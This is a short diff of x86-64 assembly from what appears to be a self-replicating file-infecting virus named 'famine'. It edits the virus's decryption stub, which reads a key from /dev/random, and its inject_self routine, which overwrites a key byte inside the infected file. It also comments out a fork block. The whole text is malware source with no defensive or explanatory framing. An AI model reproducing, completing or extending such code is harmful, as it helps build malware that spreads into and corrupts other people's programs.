@@ -10,11 +10,11 @@ DECYPHER
 
 
 .enc_start:
-	mov rax, _fork
-	syscall
-	cmp rax, 0
-	POP
-	jne _exx
+;	mov rax, _fork
+;	syscall
+;	cmp rax, 0
+;	POP
+;	jne _exx
 
 	mov rbp, rsp
 	sub rbp, famine_size  ; reserve famine_size bytes on the stack
@@ -25,6 +25,7 @@ DECYPHER
 	syscall					; OPEN /dev/random  EXIT if not work
 	cmp rax, 0
 	jl	_exx_pop
+	push rax
 
 	mov rdi, rax		; fd to read
 	mov rax, _read
@@ -32,6 +33,7 @@ DECYPHER
 	lea rsi, STACK(famine.key)
 	syscall				; READ 2 byte, 1 for key, 1 for derivate
 	
+	pop rax
 	mov rdi, rax		; fd to read
 	mov rax, _read
 	mov rdx, 1
@@ -275,7 +277,7 @@ inject_self:
 	mov rax, _pwrite			;OVERWRITE THE FACTOR VALUE
 	lea rsi, STACK(famine.factor)
 	mov rdx, 1
-	add r10, 79 ; FILE EOF + 80 = KEY FACTOR OFFSET
+	add r10, 66 ; FILE EOF + 80 = KEY FACTOR OFFSET
 	syscall
 
 
